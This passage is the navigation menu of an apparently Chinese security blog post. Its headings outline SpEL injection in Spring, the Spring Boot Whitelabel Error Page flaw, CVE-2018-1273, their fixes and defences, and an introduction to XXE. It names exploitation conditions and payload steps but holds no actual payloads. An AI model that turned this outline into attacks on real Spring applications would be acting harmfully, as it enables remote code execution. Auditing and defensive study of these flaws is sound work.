href="#用法"><span class="nav-number">1.38.1.</span> <span class="nav-text">用法</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#SpEl表达式有3种用法-Value、xml配置、代码块中使用Expression。在漏洞审计过程中-主要关注Expression这种情况-另外两种情况一般都是写死的-攻击者不可控"><span class="nav-number">1.38.1.1.</span> <span class="nav-text">SpEl表达式有3种用法,@Value、xml配置、代码块中使用Expression。在漏洞审计过程中,主要关注Expression这种情况,另外两种情况一般都是写死的,攻击者不可控</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#value"><span class="nav-number">1.38.2.</span> <span class="nav-text">@value</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#xml配置-jackson的CVE-2017-17485构造恶意xml文件就是这种方式"><span class="nav-number">1.38.3.</span> <span class="nav-text">xml配置(jackson的CVE-2017-17485构造恶意xml文件就是这种方式)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#代码块中使用Expression"><span class="nav-number">1.38.4.</span> <span class="nav-text">代码块中使用Expression</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SpEL工作流程"><span class="nav-number">1.38.5.</span> <span class="nav-text">SpEL工作流程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#语法实例"><span class="nav-number">1.38.6.</span> <span class="nav-text">语法实例</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#除了基本类型表达式，我们需要掌握的是类相关的表达式"><span class="nav-number">1.38.6.1.</span> <span class="nav-text">除了基本类型表达式，我们需要掌握的是类相关的表达式</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#类相关表达式"><span class="nav-number">1.38.7.</span> <span class="nav-text">类相关表达式</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#使用T-Type-表示Type类的实例-Type为全限定名称-如T-com-test-Bean1-。但是java-lang例外-该包下的类可以不指定包名。得到类实例后会访问类静态方法与字段"><span class="nav-number">1.38.7.1.</span> <span class="nav-text">使用T(Type)表示Type类的实例,Type为全限定名称,如T(com.test.Bean1)。但是java.lang例外,该包下的类可以不指定包名。得到类实例后会访问类静态方法与字段</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#弹出画图"><span class="nav-number">1.39.</span> <span class="nav-text">弹出画图</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#类的实例化"><span class="nav-number">1.39.1.</span> <span class="nav-text">类的实例化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#对象方法的调用"><span class="nav-number">1.39.2.</span> <span class="nav-text">对象方法的调用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#与java语法一样，直接调用即可"><span class="nav-number">1.39.2.1.</span> <span class="nav-text">与java语法一样，直接调用即可</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#变量定义及引用"><span class="nav-number">1.39.3.</span> <span class="nav-text">变量定义及引用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#变量通过EvaluationContext接口的setVariable-name-value-定义-在表达式中使用-name引用-另外还可以用-root与-this引用根对象与上下文对象"><span class="nav-number">1.39.3.1.</span> <span class="nav-text">变量通过EvaluationContext接口的setVariable(name,value)定义,在表达式中使用#name引用;另外还可以用#root与#this引用根对象与上下文对象.</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主要接口"><span class="nav-number">1.40.</span> <span class="nav-text">主要接口</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ExpressionParser"><span class="nav-number">1.40.1.</span> <span class="nav-text">ExpressionParser</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#解析器，该接口的默认实现是SpelExpressionParser，使用其parseExpression-方法将字符串表达式转换为Expression对象。"><span class="nav-number">1.40.1.1.</span> <span class="nav-text">解析器，该接口的默认实现是SpelExpressionParser，使用其parseExpression()方法将字符串表达式转换为Expression对象。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#实例："><span class="nav-number">1.40.2.</span> <span class="nav-text">实例：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ParserContext接口用于定义传入的字符串表达式是不是模板-我们这里自定义一个ParserContext对象，并实现主要方法"><span class="nav-number">1.40.2.1.</span> <span class="nav-text">ParserContext接口用于定义传入的字符串表达式是不是模板,我们这里自定义一个ParserContext对象，并实现主要方法</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们使用parseExpression-解析表达式时指定该对象-表示传入表达式须为模板-格式。"><span class="nav-number">1.40.2.2.</span> <span class="nav-text">我们使用parseExpression()解析表达式时指定该对象,表示传入表达式须为模板(${})格式。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Expression接口"><span class="nav-number">1.40.3.</span> <span class="nav-text">Expression接口</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#表达式对象-默认实现为org-springframework-expression-spel-standard的SpelExpression-其中getValue-方法用于获取表达式值-setValue-方法用于设置对象值-都会执行表达式-所以SpEl注入要重点关注这两个方法"><span class="nav-number">1.40.3.1.</span> <span class="nav-text">表达式对象,默认实现为org.springframework.expression.spel.standard的SpelExpression,其中getValue()方法用于获取表达式值,setValue()方法用于设置对象值(都会执行表达式,所以SpEl注入要重点关注这两个方法)</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EvaluationContext接口"><span class="nav-number">1.40.4.</span> <span class="nav-text">EvaluationContext接口</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#表示上下文环境-用于解析属性，方法与特殊字段的一个接口。默认实现为org-springframework-expression-spel-support中的StandardEvaluationContext-使用setRootObject设置根对象-setVariable-注册自定义变脸-registerFunction-注册自定义函数等等"><span class="nav-number">1.40.4.1.</span> <span class="nav-text">表示上下文环境,用于解析属性，方法与特殊字段的一个接口。默认实现为org.springframework.expression.spel.support中的StandardEvaluationContext,使用setRootObject设置根对象,setVariable()注册自定义变脸,registerFunction()注册自定义函数等等</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SpEl提供的2个EvaluationContext的区别"><span class="nav-number">1.40.5.</span> <span class="nav-text">SpEl提供的2个EvaluationContext的区别</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SpEL导致的任意命令执行原理分析"><span class="nav-number">1.41.</span> <span class="nav-text">SpEL导致的任意命令执行原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#成因"><span class="nav-number">1.41.1.</span> <span class="nav-text">成因:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-不设置容器-默认ApplciationContext-或设为StandardEvaluationContext"><span class="nav-number">1.41.1.1.</span> <span class="nav-text">1.不设置容器(默认ApplciationContext)或设为StandardEvaluationContext</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-用户可控控制表达式内容且无过滤"><span class="nav-number">1.41.1.2.</span> <span class="nav-text">2.用户可控控制表达式内容且无过滤</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-最后使用getValue-或setValue-执行了表达式"><span class="nav-number">1.41.1.3.</span> <span class="nav-text">3.最后使用getValue()或setValue()执行了表达式</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-可以运行上面的代码，查看执行的效果。"><span class="nav-number">1.41.1.4.</span> <span class="nav-text">4.可以运行上面的代码，查看执行的效果。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞案例分析"><span class="nav-number">1.42.</span> <span class="nav-text">漏洞案例分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SpringBoot-SpEL表达式注入漏洞"><span class="nav-number">1.42.1.</span> <span class="nav-text">SpringBoot SpEL表达式注入漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用SpEL渲染错误页面，当攻击者传入SpEL表达式，程序解析时触发执行表达式"><span class="nav-number">1.42.2.</span> <span class="nav-text">使用SpEL渲染错误页面，当攻击者传入SpEL表达式，程序解析时触发执行表达式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用条件"><span class="nav-number">1.42.3.</span> <span class="nav-text">利用条件</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-SpringBoot版本"><span class="nav-number">1.42.3.1.</span> <span class="nav-text">1.SpringBoot版本</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-在Controller中，异常信息中存在可控数据"><span class="nav-number">1.42.3.2.</span> <span class="nav-text">2.在Controller中，异常信息中存在可控数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.43.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#新建一个Maven项目如下："><span class="nav-number">1.43.1.</span> <span class="nav-text">新建一个Maven项目如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#直接运行DemoApplication-main-即可启动SpringBoot程序"><span class="nav-number">1.43.2.</span> <span class="nav-text">直接运行DemoApplication.main()即可启动SpringBoot程序</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#请求："><span class="nav-number">1.43.3.</span> <span class="nav-text">请求：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.44.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞成因"><span class="nav-number">1.44.1.</span> <span class="nav-text">漏洞成因</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ErrorMvcAutoConfiguration下面的SpelView类的render-该方法作用是解析Whitelabel-Error-Page模板内容并填充数据-在填充数据过程中递归解析的-message-用户可控-导致SpEl表达式注入。"><span class="nav-number">1.44.1.1.</span> <span class="nav-text">ErrorMvcAutoConfiguration下面的SpelView类的render(),该方法作用是解析Whitelabel Error Page模板内容并填充数据,在填充数据过程中递归解析的${message}(用户可控),导致SpEl表达式注入。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#下面参考人家的调试过程。"><span class="nav-number">1.45.</span> <span class="nav-text">下面参考人家的调试过程。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#开始调试-首先进入org-springframework-boot-autoconfigure-web-ErrorMvcAutoConfiguration-render"><span class="nav-number">1.45.1.</span> <span class="nav-text">开始调试,首先进入org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration#render()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#函数设置this-context的RootObject值-接着调用replacePlaceholders-其中"><span class="nav-number">1.45.2.</span> <span class="nav-text">函数设置this.context的RootObject值,接着调用replacePlaceholders(),其中</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#跟进replacePlaceholders"><span class="nav-number">1.45.3.</span> <span class="nav-text">跟进replacePlaceholders():</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#该方法作用是将表达式结果替换，跟进parseStringValue-这个就是我们解析的关键函数"><span class="nav-number">1.45.4.</span> <span class="nav-text">该方法作用是将表达式结果替换，跟进parseStringValue(),这个就是我们解析的关键函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#循环取得以-开头-以-为结尾的表达式-挨个赋值。当解析到message时，跟进resolvePlaceholder"><span class="nav-number">1.45.5.</span> <span class="nav-text">循环取得以${开头,以}为结尾的表达式,挨个赋值。当解析到message时，跟进resolvePlaceholder():</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#就到了我们解析表达式的地方："><span class="nav-number">1.45.6.</span> <span class="nav-text">就到了我们解析表达式的地方：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因为-message-内容为-paylaod-所以会再次解析"><span class="nav-number">1.45.7.</span> <span class="nav-text">因为${message}内容为${paylaod},所以会再次解析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最后调用getValue-造成命令执行"><span class="nav-number">1.45.8.</span> <span class="nav-text">最后调用getValue()造成命令执行</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Whitelabel-Error-Page是如何实现的"><span class="nav-number">1.46.</span> <span class="nav-text">Whitelabel Error Page是如何实现的</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#为什么我们的controller发生错误-而我们自己没有进行异常捕获-默认会跳转到Whitelabel-Error-Page页面"><span class="nav-number">1.46.1.</span> <span class="nav-text">为什么我们的controller发生错误,而我们自己没有进行异常捕获,默认会跳转到Whitelabel Error Page页面</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SpringBoot内部提供了一个ErrorController为BasicErrorController-其-RequestMapping默认为-error-当SpringBoot程序的Controller发生错误，默认去访问-error-请求在BasicErrorController处理-返回error视图-而error这个Bean在ErrorMvcAutoConfiguration的自动化配置类中定义-它会返回SpelView视图也就是刚才的Whitelabel-Error-Page页面"><span class="nav-number">1.46.2.</span> <span class="nav-text">SpringBoot内部提供了一个ErrorController为BasicErrorController,其@RequestMapping默认为/error,当SpringBoot程序的Controller发生错误，默认去访问/error,请求在BasicErrorController处理,返回error视图,而error这个Bean在ErrorMvcAutoConfiguration的自动化配置类中定义,它会返回SpelView视图也就是刚才的Whitelabel Error Page页面</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们漏洞发生的地方就是在使用SpEl表达式从当前context的RootObject中获取相关数据-exception-path-message等-填充到Whitelabel-Error-Page页面时发生的。"><span class="nav-number">1.46.3.</span> <span class="nav-text">我们漏洞发生的地方就是在使用SpEl表达式从当前context的RootObject中获取相关数据(exception path message等)填充到Whitelabel Error Page页面时发生的。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复"><span class="nav-number">1.47.</span> <span class="nav-text">漏洞修复</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#参考-https-github-com-spring-projects-spring-boot-commit-edb16a13ee33e62b046730a47843cb5dc92054e6-diff-split"><span class="nav-number">1.47.1.</span> <span class="nav-text">参考:https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6?diff=split</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SpringBoot版本为1-3-5-RELEASE"><span class="nav-number">1.47.2.</span> <span class="nav-text">SpringBoot版本为1.3.5.RELEASE</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#官方给的修复方式是增加了NonRecursivePropertyPlaceholderHelper类-防止递归解析其中的SpEl表达式"><span class="nav-number">1.47.3.</span> <span class="nav-text">官方给的修复方式是增加了NonRecursivePropertyPlaceholderHelper类,防止递归解析其中的SpEl表达式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SpelView类的helper变为了NonRecursivePropertyPlaceholderHelper对象"><span class="nav-number">1.47.4.</span> <span class="nav-text">SpelView类的helper变为了NonRecursivePropertyPlaceholderHelper对象:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试补丁"><span class="nav-number">1.48.</span> <span class="nav-text">测试补丁</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#第一次解析-messae-时-类型为"><span class="nav-number">1.48.1.</span> <span class="nav-text">第一次解析${messae}时,类型为:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#接着会判断是否是NonRecursivePlaceholderResolver的实例对象-若是-则直接返回null-若不是再解析"><span class="nav-number">1.48.2.</span> <span class="nav-text">接着会判断是否是NonRecursivePlaceholderResolver的实例对象,若是,则直接返回null,若不是再解析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#所以第一次解析-message-时-会去解析表达式expression得到我们的payload-而再次解析我们传入payload时-类型变为"><span class="nav-number">1.48.3.</span> <span class="nav-text">所以第一次解析${message}时,会去解析表达式expression得到我们的payload,而再次解析我们传入payload时,类型变为:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#所以会直接返回null-解析失败。"><span class="nav-number">1.48.4.</span> <span class="nav-text">所以会直接返回null,解析失败。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注意"><span class="nav-number">1.49.</span> <span class="nav-text">注意:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#若修改了SpringBoot的版本-Spring的版本也要跟着修改匹配-匹配表-https-www-cnblogs-com-badtree-articles-9145493-html"><span class="nav-number">1.49.1.</span> <span class="nav-text">若修改了SpringBoot的版本,Spring的版本也要跟着修改匹配,匹配表:https://www.cnblogs.com/badtree/articles/9145493.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）"><span class="nav-number">1.49.2.</span> <span class="nav-text">Spring Data Commons远程代码执行漏洞（CVE-2018-1273）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用了StandardEvaluationContext作为虚拟容器-表达式可控且最后调用了其setValue-方法"><span class="nav-number">1.49.3.</span> <span class="nav-text">使用了StandardEvaluationContext作为虚拟容器,表达式可控且最后调用了其setValue()方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞环境参考-https-github-com-wearearima-poc-cve-2018-1273"><span class="nav-number">1.49.4.</span> <span class="nav-text">漏洞环境参考:https://github.com/wearearima/poc-cve-2018-1273</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用条件-1"><span class="nav-number">1.50.</span> <span class="nav-text">利用条件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#影响版本："><span class="nav-number">1.50.1.</span> <span class="nav-text">影响版本：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-1"><span class="nav-number">1.51.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#传入payload"><span class="nav-number">1.51.1.</span> <span class="nav-text">传入payload:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#根据分析文章-我们直接定位到org-springframework-data-web-MapDataBinder-setProperty-下个断点-由函数名字可看出该方法作用时是设置成员变量值"><span class="nav-number">1.51.2.</span> <span class="nav-text">根据分析文章,我们直接定位到org.springframework.data.web.MapDataBinder.setProperty(),下个断点,由函数名字可看出该方法作用时是设置成员变量值</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#propertyName是我们传入的payload-接着设置了context与expression-最后调用setValue-触发"><span class="nav-number">1.51.3.</span> <span class="nav-text">propertyName是我们传入的payload,接着设置了context与expression,最后调用setValue()触发</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#弹出计算器"><span class="nav-number">1.51.4.</span> <span class="nav-text">弹出计算器</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修复"><span class="nav-number">1.52.</span> <span class="nav-text">修复</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#官方修复代码-https-github-com-spring-projects-spring-data-commons-commit-ae1dd2741ce06d44a0966ecbd6f47beabde2b653"><span class="nav-number">1.52.1.</span> <span class="nav-text">官方修复代码:https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#大意为StandardEvaluationContext更换为SimpleEvaluationContext-在基础知识中我们已经讲到后者权限较小-不能执行恶意代码-只支持一些map结构-所以可以防止被攻击。"><span class="nav-number">1.52.2.</span> <span class="nav-text">大意为StandardEvaluationContext更换为SimpleEvaluationContext,在基础知识中我们已经讲到后者权限较小,不能执行恶意代码,只支持一些map结构,所以可以防止被攻击。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御"><span class="nav-number">1.53.</span> <span class="nav-text">防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#最简单的方法就是使用较为安全的实现类SimpleEvaluationContext去防御"><span class="nav-number">1.53.1.</span> <span class="nav-text">最简单的方法就是使用较为安全的实现类SimpleEvaluationContext去防御</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#官方文档可参考-https-docs-spring-io-spring-docs-5-0-6-RELEASE-javadoc-api-org-springframework-expression-spel-support-SimpleEvaluationContext-html"><span class="nav-number">1.53.2.</span> <span class="nav-text">官方文档可参考:https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#一般使用："><span class="nav-number">1.53.3.</span> <span class="nav-text">一般使用：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结-1"><span class="nav-number">1.54.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一般使用SpEl表达式的就是利用其内部使用反射这个特点-从而很方便去操作Bean-存取数据等。以后在审计时可以通过留意StandardEvaluationContext与getValue-setValue-这些关键方法。"><span class="nav-number">1.54.1.</span> <span class="nav-text">一般使用SpEl表达式的就是利用其内部使用反射这个特点,从而很方便去操作Bean 存取数据等。以后在审计时可以通过留意StandardEvaluationContext与getValue() setValue()这些关键方法。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接"><span class="nav-number">1.54.2.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-www-cnblogs-com-litlife-p-10183137-html-x04-E5-8F-82-E8-80-83-E6-96-87-E7-AB-A0"><span class="nav-number">1.54.3.</span> <span class="nav-text">https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-www-cnblogs-com-litlife-p-10183137-html-x04-E5-8F-82-E8-80-83-E6-96-87-E7-AB-A0-1"><span class="nav-number">1.54.4.</span> <span class="nav-text">https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-mp-weixin-qq-com-s-biz-MzAwMzI0MTMwOQ-amp-mid-2650173748-amp-idx-1-amp-sn-a0fa9e48ed05d80b7c693082f6b687ce-amp-scene-1-amp-srcid-0911LaFVNrVdYZr7nIyS8Nn3-rd"><span class="nav-number">1.54.5.</span> <span class="nav-text">https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;mid=2650173748&amp;idx=1&amp;sn=a0fa9e48ed05d80b7c693082f6b687ce&amp;scene=1&amp;srcid=0911LaFVNrVdYZr7nIyS8Nn3#rd</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-www-kingkk-com-2019-05-SPEL-E8-A1-A8-E8-BE-BE-E5-BC-8F-E6-B3-A8-E5-85-A5-E5-85-A5-E9-97-A8-E7-AF-87"><span class="nav-number">1.54.6.</span> <span class="nav-text">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-laworigin-github-io-2019-04-09-Spring-messaging-SPEL-Injection"><span class="nav-number">1.54.7.</span> <span class="nav-text">https://laworigin.github.io/2019/04/09/Spring-messaging-SPEL-Injection/</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SpEL表达式测试注入篇："><span class="nav-number">1.55.</span> <span class="nav-text">SpEL表达式测试注入篇：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#基础测试例子："><span class="nav-number">1.55.1.</span> <span class="nav-text">基础测试例子：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#对于这种我们先简单输入2-2，如果解析返回值是4存在注入。"><span class="nav-number">1.55.2.</span> <span class="nav-text">对于这种我们先简单输入2*2，如果解析返回值是4存在注入。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#简单执行系统命令："><span class="nav-number">1.55.3.</span> <span class="nav-text">简单执行系统命令：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上面已经详细介绍了污染的版本，和解决方案。"><span class="nav-number">1.55.4.</span> <span class="nav-text">上面已经详细介绍了污染的版本，和解决方案。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#下面给出过滤规则："><span class="nav-number">1.55.5.</span> <span class="nav-text">下面给出过滤规则：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload如下："><span class="nav-number">1.55.6.</span> <span class="nav-text">payload如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们可以一步一步来分析下这个payload"><span class="nav-number">1.55.7.</span> <span class="nav-text">我们可以一步一步来分析下这个payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xxe篇："><span class="nav-number">1.56.</span> <span class="nav-text">xxe篇：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#什么是XXE："><span class="nav-number">1.56.1.</span> <span class="nav-text">什么是XXE：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#XXE-XML-External-Entity-Injection-全称为-XML-外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。-看到这里肯定有人要说：你这不是在废话-，固然，其实我这里废话只是想强调我们的利用点是-外部实体-，也是提醒读者将注意力集中于外部实体中，而不要被-XML-中其他的一些名字相似的东西扰乱了思维-盯好外部实体就行了-，如果能注入-外部实体并且成功解析的话，这就会大大拓宽我们-XML-注入的攻击面（这可能就是为什么单独说-而没有说-XML-注入的原因吧，或许普通的-XML-注入真的太鸡肋了，现实中几乎用不到）"><span class="nav-number">1.56.1.1.</span> <span class="nav-text">XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 外部实体 ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(盯好外部实体就行了)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#背景知识："><span class="nav-number">1.57.</span> <span class="nav-text">背景知识：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML，-XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。-外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。-但是，在处理外部实体时，可以针对应用程序启动许多攻击。-这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。-通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。"><span class="nav-number">1.57.0.1.</span> <span class="nav-text">XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</span></a></li></ol></li></ol><li class="nav-item nav-level-4"><a class="nav-link" href="#基础知识："><span class="nav-number">1.58.</span> <span class="nav-text">基础知识：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD-document-type-definition-的东西控制的，如下："><span class="nav-number">1.58.1.</span> <span class="nav-text">XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD(document type definition)的东西控制的，如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码："><span class="nav-number">1.58.2.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#上面这个-DTD-就定义了-XML-的根元素是-message，然后跟元素下面有一些子元素，那么-XML-到时候必须像下面这么写"><span class="nav-number">1.58.2.1.</span> <span class="nav-text">上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</span></a></li></ol></li><li class="nav-item nav-level-5"><a 